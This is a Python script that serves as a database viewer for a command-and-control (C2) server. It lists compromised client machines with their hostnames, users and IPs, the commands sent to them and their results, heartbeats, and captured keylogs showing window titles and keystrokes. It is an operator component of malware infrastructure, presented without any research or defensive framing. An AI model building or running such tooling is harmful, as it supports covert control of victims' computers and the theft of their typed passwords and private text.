from database import DatabaseManager
from datetime import datetime

db = DatabaseManager()

print("="*60)
print("📊 DATABASE VIEWER - C2 Server")
print("="*60)

# 1. Clients
print("\n🖥️  CLIENTS:")
print("-" * 60)
clients = db.get_all_clients()
for client in clients:
    status = "🟢 ONLINE" if client['online'] else "🔴 OFFLINE"
    print(f"{status} | {client['client_id']}")
    print(f"   Host: {client['hostname']} | User: {client['username']}")
    print(f"   IP: {client['ip']} | Platform: {client['platform']}")
    print(f"   First seen: {datetime.fromtimestamp(client['first_seen']).strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"   Checkins: {client['checkin_count']}")
    print()

# 2. Commands
print("\n⚡ COMMANDS:")
print("-" * 60)
from database import Command
commands = db.session.query(Command).order_by(Command.created_at.desc()).limit(10).all()
for cmd in commands:
    status_icon = {"pending": "⏳", "sent": "📤", "completed": "✅", "failed": "❌"}.get(cmd.status, "❓")
    print(f"{status_icon} {cmd.command_id} | {cmd.action} | {cmd.status}")
    print(f"   Client: {cmd.client_id}")
    print(f"   Created: {cmd.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
    if cmd.result:
        print(f"   Result: {str(cmd.result)[:100]}...")
    print()

# 3. Events
print("\n📋 RECENT EVENTS:")
print("-" * 60)
events = db.get_events(limit=10)
for event in events:
    severity_icon = {"info": "ℹ️", "warning": "⚠️", "error": "❌", "critical": "🔥"}.get(event['severity'], "•")
    print(f"{severity_icon} {event['event_type']} | {event['client_id'] or 'N/A'}")
    print(f"   {event['description']}")
    print(f"   {event['timestamp']}")
    print()

# 4. Heartbeats
print("\n💓 RECENT HEARTBEATS:")
print("-" * 60)
from database import Heartbeat
heartbeats = db.session.query(Heartbeat).order_by(Heartbeat.timestamp.desc()).limit(10).all()
for hb in heartbeats:
    print(f"💓 {hb.client_id} | {hb.timestamp.strftime('%Y-%m-%d %H:%M:%S')}")

# 5. Keylogs
print("\n⌨️  KEYLOGS:")
print("-" * 60)
from database import Keylog
keylogs = db.session.query(Keylog).order_by(Keylog.timestamp.desc()).limit(10).all()
for log in keylogs:
    print(f"⌨️  {log.client_id} | {log.window}")
    print(f"   {log.keystroke} | {log.timestamp.strftime('%Y-%m-%d %H:%M:%S')}")

# 6. Statistics
print("\n📈 STATISTICS:")
print("-" * 60)
stats = db.get_statistics()
for key, value in stats.items():
    print(f"{key}: {value}")

print("\n" + "="*60)
db.close()
